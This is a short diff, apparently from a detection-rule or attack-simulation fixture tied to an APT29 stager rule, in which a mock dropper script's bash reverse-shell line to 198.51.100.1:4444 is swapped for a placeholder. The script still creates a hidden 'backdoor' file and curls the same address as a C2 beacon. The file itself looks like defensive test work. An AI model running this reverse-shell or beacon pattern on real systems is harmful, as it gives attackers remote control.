@@ -150,7 +150,7 @@ rule APT29_CozyBear_Stager_Beacon {{
 echo "[*] Initializing dropper payload..."
 mkdir -p .hidden_beacon
 echo "MOCK_USER_DATA_LOCKED_2026" > user_data.lock
-echo "bash -i >& /dev/tcp/198.51.100.1/4444 0>&1" > .hidden_beacon/backdoor.sh
+echo "MOCK_PERSISTENCE_STAGE2" > .hidden_beacon/backdoor.sh
 chmod +x .hidden_beacon/backdoor.sh
 echo "[*] Attempting C2 beacon to 198.51.100.1..."
 curl -s --connect-timeout 2 http://198.51.100.1/beacon || echo "BEACON_BLOCKED"
